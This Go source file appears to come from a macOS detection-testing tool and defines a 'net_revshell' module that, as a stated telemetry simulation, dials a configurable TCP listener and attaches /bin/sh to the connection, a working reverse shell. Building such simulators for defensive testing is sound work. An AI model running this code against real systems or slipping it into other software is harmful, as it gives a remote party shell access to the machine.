package network

import (
	"context"
	"fmt"
	"net"
	"os/exec"
	"strconv"

	"github.com/0xv1n/macnoise/internal/output"
	"github.com/0xv1n/macnoise/pkg/module"
)

type netRevShell struct{}

func (n *netRevShell) Info() module.ModuleInfo {
	return module.ModuleInfo{
		Name:        "net_revshell",
		EventTypes:  []string{"reverse_shell_attempt"},
		Description: "Spawns /bin/sh and pipes stdio to a remote TCP connection (telemetry simulation)",
		Category:    module.CategoryNetwork,
		Tags:        []string{"tcp", "reverse-shell", "execution"},
		Privileges:  module.PrivilegeNone,
		MITRE: []module.MITRE{
			{Technique: "T1059", SubTech: ".004", Name: "Command and Scripting Interpreter: Unix Shell"},
			{Technique: "T1071", Name: "Application Layer Protocol"},
		},
		Author:   "0xv1n",
		MinMacOS: "12.0",
	}
}

func (n *netRevShell) ParamSpecs() []module.ParamSpec {
	return []module.ParamSpec{
		{Name: "target", Description: "Listener IP (must have nc/socat listening)", Type: module.ParamString, Default: "127.0.0.1", Example: "10.0.0.1"},
		{Name: "port", Description: "Listener port", Type: module.ParamInteger, Default: 4444, Example: 4444, Range: &module.IntegerRange{Min: 1, Max: 65535}},
	}
}

func (n *netRevShell) CheckPrereqs(ctx context.Context, params module.Params) error { return nil }

func (n *netRevShell) Generate(ctx context.Context, params module.Params, emit module.EventEmitter) error {
	target := params.String("target", "127.0.0.1")
	port := strconv.Itoa(params.Int("port", 4444))
	address := net.JoinHostPort(target, port)

	info := n.Info()
	ev := output.NewEvent(info, "reverse_shell_attempt", false, fmt.Sprintf("connecting /bin/sh to %s", address))

	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", address)
	if err != nil {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		ev = output.WithOutcome(ev, module.OutcomeDenied, err)
		ev.Message = fmt.Sprintf("reverse shell attempt to %s (connection refused — no listener)", address)
		emit(ev)
		return nil
	}
	defer func() { _ = conn.Close() }()
	// Pass the socket descriptor directly. Using net.Conn as an io.Reader
	// starts an exec copy goroutine that can remain blocked on the peer even
	// after the shell exits or is killed by cancellation.
	socket, err := conn.(*net.TCPConn).File()
	if err != nil {
		emit(output.WithError(ev, err))
		return err
	}
	defer func() { _ = socket.Close() }()
	cmd := exec.CommandContext(ctx, "/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = socket, socket, socket
	if err := cmd.Start(); err != nil {
		emit(output.WithError(ev, err))
		return err
	}

	ev.Success = true
	ev.Message = fmt.Sprintf("reverse shell connected to %s, spawning /bin/sh", address)
	ev = output.WithDetails(ev, map[string]any{"address": address, "shell": "/bin/sh"})
	emit(ev)

	err = cmd.Wait()
	if ctx.Err() != nil {
		return ctx.Err()
	}
	return err
}

func (n *netRevShell) DryRun(params module.Params) []string {
	target := params.String("target", "127.0.0.1")
	port := strconv.Itoa(params.Int("port", 4444))
	return []string{
		fmt.Sprintf("dial TCP %s:%s", target, port),
		"attach /bin/sh stdin/stdout/stderr to connection",
	}
}

func (n *netRevShell) Cleanup(ctx context.Context) error { return nil }

func init() {
	module.Register(func() module.Generator { return &netRevShell{} })
}
